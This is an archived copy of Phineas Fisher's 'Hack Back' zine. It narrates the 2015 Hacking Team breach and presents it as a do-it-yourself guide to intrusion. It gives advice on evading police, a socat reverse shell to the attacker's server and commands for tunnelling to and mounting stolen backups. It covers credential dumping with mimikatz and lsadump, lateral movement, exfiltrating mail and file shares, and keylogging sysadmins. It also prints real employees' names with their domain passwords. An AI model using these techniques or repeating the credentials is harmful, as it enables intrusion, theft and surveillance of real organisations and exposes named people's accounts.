---
title: "Hack Back — A DIY Guide (Hacking Team)"
author: "Phineas Fisher"
date: "2020"
category: "anarchism"
source: "https://theanarchistlibrary.org/library/hack-back-subcowmandante-marcos-phineas-fisher-hack-back-a-diy-guide-hacking-team"
source_name: "theanarchistlibrary.org"
page_type: book
mirror_state: none
language: "en"
description: "This was second hacking zine released by Hack Back / Phineas Fisher / Subcowmandante Marcos on Hacking Team breach in 2015. The zine was backed up on PacketStorm. packetstormsecurity.com"
tags:
  - "english"
  - "anarchism"
files:
  - name: "hack-back-subcowmandante-marcos-phineas-fisher-hack-back-a-diy-guide-hacking-team.epub"
    type: "EPUB"
    url: "https://theanarchistlibrary.org/library/hack-back-subcowmandante-marcos-phineas-fisher-hack-back-a-diy-guide-hacking-team.epub"
    hosted: false
---

[Read on theanarchistlibrary.org](https://theanarchistlibrary.org/library/hack-back-subcowmandante-marcos-phineas-fisher-hack-back-a-diy-guide-hacking-team)

_ _ _ ____ _ _ | | | | __ _ ___| | __ | __ ) __ _ ___| | _| | | |_| |/ _` |/ __| |/ / | _ \ / _` |/ __| |/ / | | _ | (_| | (__| < | |_) | (_| | (__| <|_| |_| |_|\__,_|\___|_|\_\ |____/ \__,_|\___|_|\_(_) A DIY Guide ,-._,-._ _,-\ o O_/; / , ` `| | \-.,___, / ` \ `-.__/ / ,.\ / `-.__.-\` ./ \' / /| ___\ ,/ `\ ( ( |.-"` '/\ \ ` \ \/ ,, | \ _ \| o/o / \. \ , / / ( __`;-;'__`) \\ `//'` `||` `\ _// || __ _ _ _____ __ .-"-._,(__) .(__).-""-. | | | | |_ _| | / \ / \ | | |_| | | | | \ / \ / | | _ | | | | `'-------` `--------'` __| |_| |_| |_| |__ #antisec 1 — Introduction You’ll notice the change in language since the last edition [1] . The English-speaking world already has tons of books, talks, guides, and info about hacking. In that world, there’s plenty of hackers better than me, but they misuse their talents working for “defense” contractors, for intelligence agencies, to protect banks and corporations, and to defend the status quo. Hacker culture was born in the US as a counterculture, but that origin only remains in its aesthetics — the rest has been assimilated. At least they can wear a t-shirt, dye their hair blue, use their hacker names, and feel like rebels while they work for the Man.

You used to have to sneak into offices to leak documents [2] . You used to need a gun to rob a bank. Now you can do both from bed with a laptop in hand [3] [4] . Like the CNT said after the Gamma Group hack: “Let’s take a step forward with new forms of struggle” [5] . Hacking is a powerful tool, let’s learn and fight!

Hacking Team was a company that helped governments hack and spy on journalists, activists, political opposition, and other threats to their power [6] [7] [8] [9] [10] [11] [12] [13] [14] [15] [16] . And, occasionally, on actual criminals and terrorists [17] . Vincenzetti, the CEO, liked to end his emails with the fascist slogan “boia chi molla”. It’d be more correct to say “boia chi vende RCS”. They also claimed to have technology to solve the “problem” posed by Tor and the darknet [18] . But seeing as I’m still free, I have my doubts about its effectiveness.

Unfortunately, our world is backwards. You get rich by doing bad things and go to jail for doing good. Fortunately, thanks to the hard work of people like the Tor project [19] , you can avoid going to jail by taking a few simple precautions:

I guess when the police arrive to seize your computer, it means you’ve already made a lot of mistakes, but it’s better to be safe.

This accomplishes two things. First, all your traffic is anonymized through Tor. Second, keeping your personal life and your hacking on separate computers helps you not to mix them by accident.

You can use projects like Whonix [21] , Tails [22] , Qubes TorVM [23] , or something custom [24] . Here’s [25] a detailed comparison.

Tor isn’t a panacea. They can correlate the times you’re connected to Tor with the times your hacker handle is active. Also, there have been successful attacks against Tor [26] . You can connect to Tor using other peoples’ wifi. Wifislax [27] is a linux distro with a lot of tools for cracking wifi. Another option is to connect to a VPN or a bridge node [28] before Tor, but that’s less secure because they can still correlate the hacker’s activity with your house’s internet activity (this was used as evidence against Jeremy Hammond [29] ).

The reality is that while Tor isn’t perfect, it works quite well. When I was young and reckless, I did plenty of stuff without any protection (I’m referring to hacking) apart from Tor, that the police tried their hardest to investigate, and I’ve never had any problems.

I don’t hack directly from Tor exit nodes. They’re on blacklists, they’re slow, and they can’t receive connect-backs. Tor protects my anonymity while I connect to the infrastructure I use to hack, which consists of:

For C&C addresses, and for DNS tunnels for guaranteed egress.

For use as C&C servers, to receive connect-back shells, to launch attacks, and to store the loot.

For use as pivots to hide the IP addresses of the stable servers. And for when I want a fast connection without pivoting, for example to scan ports, scan the whole internet, download a database with sqli, etc.

Obviously, you have to use an anonymous payment method, like bitcoin (if it’s used carefully).

In the news we often see attacks traced back to government-backed hacking groups (“APTs”), because they repeatedly use the same tools, leave the same footprints, and even use the same infrastructure (domains, emails, etc). They’re negligent because they can hack without legal consequences.

I didn’t want to make the police’s work any easier by relating my hack of Hacking Team with other hacks I’ve done or with names I use in my day-to-day work as a blackhat hacker. So, I used new servers and domain names, registered with new emails, and payed for with new bitcoin addresses. Also, I only used tools that are publicly available, or things that I wrote specifically for this attack, and I changed my way of doing some things to not leave my usual forensic footprint.

Although it can be tedious, this stage is very important, since the larger the attack surface, the easier it is to find a hole somewhere in it.

A lot of interesting things can be found with a few well-chosen search queries. For example, the identity of DPR [30] . The bible of Google hacking is the book “Google Hacking for Penetration Testers”. You can find a short summary in Spanish at [31] .

Often, a company’s main website is hosted by a third party, and you’ll find the company’s actual IP range thanks to subdomains like mx.company.com or ns1.company.com. Also, sometimes there are things that shouldn’t be exposed in “hidden” subdomains. Useful tools for discovering domains and subdomains are fierce [32] , theHarvester [33] , and recon-ng [34] .

With a reverse lookup using the whois information from a domain or IP range of a company, you can find other domains and IP ranges. As far as I know, there’s no free way to do reverse lookups aside from a google “hack”:

“via della moscova 13” site:www.findip-address.com “via della moscova 13” site:domaintools.com

Unlike the other techniques, this talks to the company’s servers. I include it in this section because it’s not an attack, it’s just information gathering. The company’s IDS might generate an alert, but you don’t have to worry since the whole internet is being scanned constantly.

For scanning, nmap [35] is precise, and can fingerprint the majority of services discovered. For companies with very large IP ranges, zmap [36] or masscan [37] are fast. WhatWeb [38] or BlindElephant [39] can fingerprint web sites.

For social engineering, it’s useful to have information about the employees, their roles, contact information, operating system, browser, plugins, software, etc. Some resources are:

I already mentioned them in the previous section, but they have a lot more functionality. They can find a lot of information quickly and automatically. It’s worth reading all their documentation.

A lot of information about the employees can be found here. The company’s recruiters are the most likely to accept your connection requests.

Previously known as jigsaw. They have contact information for many employees.

A lot of information about employees and their systems can be found in metadata of files the company has published. Useful tools for finding files on the company’s website and extracting the metadata are metagoofil [40] and FOCA [41] .

There are various ways to get a foothold. Since the method I used against Hacking Team is uncommon and a lot more work than is usually necessary, I’ll talk a little about the two most common ways, which I recommend trying first.

Social engineering, specifically spear phishing, is responsible for the majority of hacks these days. For an introduction in Spanish, see [42] . For more information in English, see [43] (the third part, “Targeted Attacks”). For fun stories about the social engineering exploits of past generations, see [44] . I didn’t want to try to spear phish Hacking Team, as their whole business is helping governments spear phish their opponents, so they’d be much more likely to recognize and investigate a spear phishing attempt.

Thanks to hardworking Russians and their exploit kits, traffic sellers, and bot herders, many companies already have compromised computers in their networks. Almost all of the Fortune 500, with their huge networks, have some bots already inside. However, Hacking Team is a very small company, and most of it’s employees are infosec experts, so there was a low chance that they’d already been compromised.

After the Gamma Group hack, I described a process for searching for vulnerabilities [45] . Hacking Team had one public IP range:

inetnum: 93.62.139.32 — 93.62.139.47 descr: HT public subnet Hacking Team had very little exposed to the internet. For example, unlike Gamma Group, their customer support site needed a client certificate to connect. What they had was their main website (a Joomla blog in which Joomscan

I did a lot of work and testing before using the exploit against Hacking Team. I wrote a backdoored firmware, and compiled various post-exploitation tools for the embedded device. The backdoor serves to protect the exploit. Using the exploit just once and then returning through the backdoor makes it harder to identify and patch the vulnerabilities.

For all the standard Unix utilities that the system didn’t have.

The most useful tool for attacking windows networks when you have access to the internal network, but no domain user.

For sniffing passwords from plaintext protocols like ftp, and for arpspoofing. I wanted to use ettercap, written by Hacking Team’s own ALoR and NaGA, but it was hard to compile it for the system.

my_server: socat file:‘tty‘,raw,echo=0 tcp-listen:my_port hacked box: socat exec:‘bash -li’,pty,stderr,setsid,sigint,sane \ tcp:my_server:my_port And useful for a lot more, it’s a networking swiss army knife. See the examples section of its documentation.

Like the shell with pty, it wasn’t really necessary, but I wanted to feel at home in Hacking Team’s network.

To use with proxychains to be able to access their local network from any program.

For forwarding ports, like for the SOCKS server, through the firewall.

The worst thing that could happen would be for my backdoor or post-exploitation tools to make the system unstable and cause an employee to investigate. So I spent a week testing my exploit, backdoor, and post-exploitation tools in the networks of other vulnerable companies before entering Hacking Team’s network.

Now inside their internal network, I wanted to take a look around and think about my next step. I started Responder.py in analysis mode (-A to listen without sending poisoned responses), and did a slow scan with nmap.

NoSQL, or rather NoAuthentication, has been a huge gift to the hacker community [60] . Just when I was worried that they’d finally patched all of the authentication bypass bugs in MySQL [61] [62] [63] [64] , new databases came into style that lack authentication by design. Nmap found a few in Hacking Team’s internal network:

Although it was fun to listen to recordings and see webcam images of Hacking Team developing their malware, it wasn’t very useful. Their insecure backups were the vulnerability that opened their doors. According to their documentation [66] , their iSCSI devices were supposed to be on a separate network, but nmap found a few in their subnetwork 192.168.1.200/24:

Nmap scan report for ht-synology.hackingteam.local (192.168.200.66) ... 3260/tcp open iscsi? | iscsi-info: | Target: iqn.2000–01.com.synology:ht-synology.name | Address: 192.168.200.66:3260,0 |_ Authentication: No authentication required Nmap scan report for synology-backup.hackingteam.local (192.168.200.72) ... 3260/tcp open iscsi? | iscsi-info: | Target: iqn.2000–01.com.synology:synology-backup.name | Address: 10.0.1.72:3260,0 | Address: 192.168.200.72:3260,0 |_ Authentication: No authentication required iSCSI needs a kernel module, and it would’ve been difficult to compile it for the embedded system. I forwarded the port so that I could mount it from a VPS:

VPS: tgcd -L -p 3260 -q 42838 Embedded system: tgcd -C -s 192.168.200.72:3260 -c VPS_IP:42838 VPS: iscsiadm -m discovery -t sendtargets -p 127.0.0.1 Now iSCSI finds the name iqn.2000–01.com.synology but has problems mounting it because it thinks its IP is 192.168.200.72 instead of 127.0.0.1

iptables -t nat -A OUTPUT -d 192.168.200.72 -j DNAT --to-destination 127.0.0.1 And now, after:

iscsiadm -m node --targetname=iqn.2000–01.com.synology:synology-backup.name -p 192.168.200.72 --login ...the device file appears! We mount it: vmfs-fuse -o ro /dev/sdb1 /mnt/tmp and find backups of various virtual machines. The Exchange server seemed like the most interesting. It was too big too download, but it was possible to mount it remotely to look for interesting files:

$ losetup /dev/loop0 Exchange.hackingteam.com-flat.vmdk $ fdisk -l /dev/loop0 /dev/loop0p1 2048 1258287103 629142528 7 HPFS/NTFS/exFAT so the offset is 2048 * 512 = 1048576

$ losetup -o 1048576 /dev/loop1 /dev/loop0 $ mount -o ro /dev/loop1 /mnt/exchange/ now in /mnt/exchange/WindowsImageBackup/EXCHANGE/Backup 2014-10-14 172311 we find the hard disk of the VM, and mount it:

vdfuse -r -t VHD -f f0f78089-d28a-11e2-a92c-005056996a44.vhd /mnt/vhd-disk/ mount -o loop /mnt/vhd-disk/Partition1 /mnt/part1 ...and finally we’ve unpacked the Russian doll and can see all the files from the old Exchange server in /mnt/part1

What interested me most in the backup was seeing if it had a password or hash that could be used to access the live server. I used pwdump, cachedump, and lsadump [67] on the registry hives. lsadump found the password to the besadmin service account:

_SC_BlackBerry MDS Connection Service 0000 16 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0010 62 00 65 00 73 00 33 00 32 00 36 00 37 00 38 00 b.e.s.3.2.6.7.8. 0020 21 00 21 00 21 00 00 00 00 00 00 00 00 00 00 00 !.!.!........... I used proxychains [68] with the socks server on the embedded device and smbclient [69] to check the password:

proxychains smbclient ‘//192.168.100.51/c$’ -U ‘hackingteam.local/besadmin%bes32678!!!’ It worked! The password for besadmin was still valid, and a local admin. I used my proxy and metasploit’s psexec_psh [70] to get a meterpreter session. Then I migrated to a 64 bit process, ran “load kiwi” [71] , “creds_wdigest”, and got a bunch of passwords, including the Domain Admin:

HACKINGTEAM BESAdmin bes32678!!! HACKINGTEAM Administrator uu8dd8ndd12! HACKINGTEAM c.pozzi P4ssword <---- lol great sysadmin HACKINGTEAM m.romeo ioLK/(90 HACKINGTEAM l.guerra 4luc@=.= HACKINGTEAM d.martinez W4tudul3sp HACKINGTEAM g.russo GCBr0s0705! HACKINGTEAM a.scarafile Cd4432996111 HACKINGTEAM r.viscardi Ht2015! HACKINGTEAM a.mino A!e$$andra HACKINGTEAM m.bettini Ettore&Bella0314 HACKINGTEAM m.luppi Blackou7 HACKINGTEAM s.gallucci 1S9i8m4o! HACKINGTEAM d.milan set!dob66 HACKINGTEAM w.furlan Blu3.B3rry! HACKINGTEAM d.romualdi Rd13136f@# HACKINGTEAM l.invernizzi L0r3nz0123! HACKINGTEAM e.ciceri 2O2571&2E HACKINGTEAM e.rabe erab@4HT! 11 — Downloading the mail With the Domain Admin password, I have access to the email, the heart of the company. Since with each step I take there’s a chance of being detected, I start downloading their email before continuing to explore. Powershell makes it easy [72] . Curiously, I found a bug with Powershell’s date handling. After downloading the emails, it took me another couple weeks to get access to the source code and everything else, so I returned every now and then to download the new emails. The server was Italian, with dates in the format day/month/year. I used:

-ContentFilter {(Received -ge ’05/06/2015’) -or (Sent -ge ’05/06/2015’)} with New-MailboxExportRequest to download the new emails (in this case all mail since June 5). The problem is it says the date is invalid if you try a day larger than 12 (I imagine because in the US the month comes first and you can’t have a month above 12). It seems like Microsoft’s engineers only test their software with their own locale.

Now that I’d gotten Domain Admin, I started to download file shares using my proxy and the -Tc option of smbclient, for example:

proxychains smbclient ‘//192.168.1.230/FAE DiskStation’ \ -U ‘HACKINGTEAM/Administrator%uu8dd8ndd12!’ -Tc FAE_DiskStation.tar ‘*’ I downloaded the Amministrazione, FAE DiskStation, and FileServer folders in the torrent like that.

Before continuing with the story of the “weones culiaos” (Hacking Team), I should give some general knowledge for hacking windows networks.

I’ll give a brief review of the different techniques for spreading withing a windows network. The techniques for remote execution require the password or hash of a local admin on the target. By far, the most common way of obtaining those credentials is using mimikatz [73] , especially sekurlsa::logonpasswords and sekurlsa::msv, on the computers where you already have admin access. The techniques for “in place” movement also require administrative privileges (except for runas). The most important tools for privilege escalation are PowerUp [74] , and bypassuac [75] .

The tried and true method for lateral movement on windows. You can use psexec [76] , winexe [77] , metasploit’s psexec_psh [78] , Powershell Empire’s invoke_psexec [79] , or the builtin windows command “sc” [80] . For the metasploit module, powershell empire, and pth-winexe [81] , you just need the hash, not the password. It’s the most universal method (it works on any windows computer with port 445 open), but it’s also the least stealthy. Event type 7045 “Service Control Manager” will appear in the event logs. In my experience, no one has ever noticed during a hack, but it helps the investigators piece together what the hacker did afterwards.

The most stealthy method. The WMI service is enabled on all windows computers, but except for servers, the firewall blocks it by default. You can use wmiexec.py [82] , pth-wmis [83] (here’s a demonstration of wmiexec and pth-wmis [84] ), Powershell Empire’s invoke_wmi [85] , or the windows builtin wmic [86] . All except wmic just need the hash.

It’s disabled by default, and I don’t recommend enabling new protocols. But, if the sysadmin has already enabled it, it’s very convenient, especially if you use powershell for everything (and you should use powershell for almost everything, it will change [88] with powershell 5 and windows 10, but for now powershell makes it easy to do everything in RAM, avoid AV, and leave a small footprint)

You can execute remote programs with at and schtasks [80] . It works in the same situations where you could use psexec, and it also leaves a well known footprint [89] .

If all those protocols are disabled or blocked by the firewall, once you’re Domain Admin, you can use GPO to give users a login script, install an msi, execute a scheduled task [13] , or, like we’ll see with the computer of Mauro Romeo (one of Hacking Team’s sysadmins), use GPO to enable WMI and open the firewall.

Once you have admin access on a computer, you can use the tokens of the other users to access resources in the domain. Two tools for doing this are incognito [89] and the mimikatz token::* commands [90] .

You can take advantage of a validation bug in Kerberos to generate Domain Admin tickets [91] [92] [93] .

If you have a user’s hash, but they’re not logged in, you can use sekurlsa::pth [90] to get a ticket for the user.

Any RAT can inject itself into other processes. For example, the migrate command in meterpreter and pupy [94] , or the psinject [95] command in powershell empire. You can inject into the process that has the token you want.

This is sometimes very useful since it doesn’t require admin privileges. The command is part of windows, but if you don’t have a GUI you can use powershell [96] .

Once you have access, you want to keep it. Really, persistence is only a challenge for assholes like Hacking Team who target activists and other individuals. To hack companies, persistence isn’t needed since companies never sleep. I always use Duqu 2 style “persistence”, executing in RAM on a couple high-uptime servers. On the off chance that they all reboot at the same time, I have passwords and a golden ticket [97] as backup access. You can read more about the different techniques for persistence in windows here [98] [99] [100] . But for hacking companies, it’s not needed and it increases the risk of detection.

The best tool these days for understanding windows networks is Powerview [101] . It’s worth reading everything written by it’s author [102] , especially [103] , [104] , [105] , and [106] . Powershell itself is also quite powerful [107] . As there are still many windows 2000 and 2003 servers without powershell, you also have to learn the old school [108] , with programs like netview.exe [109] or the windows builtin “net view”. Other techniques that I like are:

With a Domain Admin account, you can download a list of all filenames in the network with powerview:

Invoke-ShareFinderThreaded -ExcludedShares IPC$,PRINT$,ADMIN$ | select-string ‘^(.*) \t-’ | %{dir -recurse $_.Matches[0].Groups[1] | select fullname | out-file -append files.txt} Later, you can read it at your leisure and choose which files to download.

As we’ve already seen, you can download email with powershell, and it has a lot of useful information.

It’s another place where many businesses store a lot of important information. It can also be downloaded with powershell [110] .

It has a lot of useful information about users and computers. Without being Domain Admin, you can already get a lot of info with powerview and other tools [112] . After getting Domain Admin, you should export all the AD information with csvde or another tool.

One of my favorite hobbies is hunting sysadmins. Spying on Christian Pozzi (one of Hacking Team’s sysadmins) gave me access to a Nagios server which gave me access to the rete sviluppo (development network with the source code of RCS). With a simple combination of Get-Keystrokes and Get-TimedScreenshot from PowerSploit [113] , Do-Exfiltration from nishang [114] , and GPO, you can spy on any employee, or even on the whole domain.

Reading their documentation about their infrastructure [115] , I saw that I was still missing access to something important — the “Rete Sviluppo”, an isolated network with the source code for RCS. The sysadmins of a company always have access to everything, so I searched the computers of Mauro Romeo and Christian Pozzi to see how they administer the Sviluppo network, and to see if there were any other interesting systems I should investigate. It was simple to access their computers, since they were part of the windows domain where I’d already gotten admin access. Mauro Romeo’s computer didn’t have any ports open, so I opened the port for WMI [116] and executed meterpreter [117] . In addition to keylogging and screen scraping with Get-Keystrokes and Get-TimeScreenshot, I used many /gather/ modules from metasploit, CredMan.ps1 [118] , and searched for interesting files [119] . Upon seeing that Pozzi had a Truecrypt volume, I waited until he’d mounted it and then copied off the files. Many have made fun of Christian Pozzi’s weak passwords (and of Christian Pozzi in general, he provides plenty of material [120] [121] [122] [123] ). I included them in the leak as a false clue, and to laugh at him. The reality is that mimikatz and keyloggers view all passwords equally.
